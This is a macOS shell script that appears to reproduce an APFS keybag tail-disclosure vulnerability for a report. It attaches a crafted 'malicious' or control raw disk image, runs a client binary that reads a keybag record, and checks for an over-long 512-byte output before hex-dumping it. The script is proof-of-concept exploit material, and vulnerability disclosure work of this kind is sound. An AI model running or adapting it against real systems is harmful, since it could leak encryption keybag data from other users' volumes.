#!/bin/sh
set -eu

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
MODE=${1:-malicious}
CLIENT="$HERE/apfs_get_record"
CONTAINER_UUID=A4503DDA-941B-4F8A-B9C5-AEA580008BF5
VOLUME_UUID=275A2789-65D4-4D88-9726-5733E3750B4E

case "$MODE" in
    malicious)
        IMAGE="$HERE/apfs_keybag_singlevol_tail_disclosure.raw"
        IMAGE_HASH=82c49ab74e3b4f1e8ec2033f2fb974850da4219fcf00d4457ff3ec0f6e6e90c1
        EXPECTED_SIZE=512
        ;;
    control)
        IMAGE="$HERE/apfs_keybag_singlevol_tail_control.raw"
        IMAGE_HASH=b6fdff9bec790b5f89945364f85c091f14ff7353cf0e2750539a5b9d83529df1
        EXPECTED_SIZE=136
        ;;
    *)
        echo "usage: $0 malicious|control" >&2
        exit 2
        ;;
esac

if [ "$(id -u)" -eq 0 ]; then
    echo "refusing to run as root; use a normal logged-in local user" >&2
    exit 2
fi

BUILD=$(sw_vers -buildVersion)
echo "build=$BUILD"
id
csrutil status 2>/dev/null || true
if [ "$BUILD" != 26A5388g ]; then
    echo "warning: package was validated on 26A5388g" >&2
fi

ACTUAL_IMAGE_HASH=$(shasum -a 256 "$IMAGE" | awk '{print $1}')
ACTUAL_CLIENT_HASH=$(shasum -a 256 "$CLIENT" | awk '{print $1}')
if [ "$ACTUAL_IMAGE_HASH" != "$IMAGE_HASH" ]; then
    echo "image hash mismatch" >&2
    exit 1
fi
if [ "$ACTUAL_CLIENT_HASH" != abcb66f0286c0aa6e11a60cbf5ac1fa968e6b13a4ba5011e7eaaf02307b8ea35 ]; then
    echo "client hash mismatch" >&2
    exit 1
fi

ATTACH_OUTPUT=$(hdiutil attach -nomount \
    -imagekey diskimage-class=CRawDiskImage "$IMAGE")
printf '%s\n' "$ATTACH_OUTPUT"
BACKING_DISK=$(printf '%s\n' "$ATTACH_OUTPUT" | awk 'NR == 1 {print $1}')
if [ -z "$BACKING_DISK" ]; then
    echo "could not identify backing disk" >&2
    exit 1
fi

cleanup() {
    diskutil eject "$BACKING_DISK" >/dev/null 2>&1 || true
}
trap cleanup EXIT INT TERM
sleep 1

OUTPUT="$HERE/apfs_${MODE}_output.bin"
rm -f "$OUTPUT"
"$CLIENT" "$CONTAINER_UUID" "$VOLUME_UUID" 2 0 "$OUTPUT"

SIZE=$(wc -c < "$OUTPUT" | tr -d ' ')
echo "output_size=$SIZE expected_size=$EXPECTED_SIZE"
if [ "$SIZE" -ne "$EXPECTED_SIZE" ]; then
    echo "unexpected output size" >&2
    exit 1
fi
shasum -a 256 "$OUTPUT"
xxd -g 1 "$OUTPUT"
